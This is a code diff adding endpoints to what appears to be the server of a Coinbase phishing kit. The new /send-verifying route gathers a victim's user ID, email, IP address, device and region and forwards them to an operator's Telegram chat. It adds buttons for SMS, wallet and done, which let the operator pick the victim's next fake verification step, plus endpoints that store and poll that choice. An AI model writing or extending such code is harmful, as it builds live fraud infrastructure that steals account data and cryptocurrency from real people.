@@ -1468,3 +1468,122 @@ app.get("/api/verification-status/:requestId", (req, res) => {
     res.status(500).json({ error: "Internal server error" });
   }
 });
+
+// ============================================================================
+// VERIFYING PAGE ENDPOINTS
+// ============================================================================
+
+// ✅ Storage for Verifying Page
+const pendingVerifying = {};
+
+app.post("/send-verifying", async (req, res) => {
+  try {
+    console.log('📥 /send-verifying endpoint called');
+    const { userId, email } = req.body;
+    console.log('🔍 DEBUG: Received userId:', userId, 'email:', email);
+    
+    if (!userId || !email) {
+      return res.status(400).json({ error: "Missing userId or email" });
+    }
+    
+    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    console.log('🔍 DEBUG: Generated verifyingId:', verifyingId);
+    
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    pendingVerifying[verifyingId] = { status: "pending", userId, email, choice: null };
+    console.log(`📥 Verifying Request received: ${verifyingId}`);
+
+    const message =
+      `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "💬 SMS - 2 💬", callback_data: `verifying_sms|${verifyingId}` },
+            { text: "🏁 Done 🏁", callback_data: `verifying_done|${verifyingId}` },
+            { text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    console.log('✅ Verifying message sent with 3 buttons');
+    res.json({ status: "pending", verifyingId });
+
+  } catch (err) {
+    console.error("❌ Verifying endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ GET /check-verifying-choice
+app.get("/check-verifying-choice", (req, res) => {
+  try {
+    const { verifyingId } = req.query;
+    if (!verifyingId) {
+      return res.status(400).json({ error: "Missing verifyingId" });
+    }
+
+    const entry = pendingVerifying[verifyingId];
+    if (!entry) {
+      return res.json({ choice: null });
+    }
+
+    res.json({ choice: entry.choice });
+  } catch (err) {
+    console.error("❌ Check verifying choice error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ POST /update-verifying-choice
+app.post("/update-verifying-choice", (req, res) => {
+  try {
+    const { verifyingId, choice } = req.body;
+    if (!verifyingId || !choice) {
+      return res.status(400).json({ error: "Missing verifyingId or choice" });
+    }
+
+    if (!pendingVerifying[verifyingId]) {
+      return res.status(400).json({ error: "Invalid verifyingId" });
+    }
+
+    pendingVerifying[verifyingId].choice = choice;
+    console.log(`✅ Updated verifying choice: ${choice} for ${verifyingId}`);
+
+    res.json({ ok: true });
+  } catch (err) {
+    console.error("❌ Update verifying choice error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
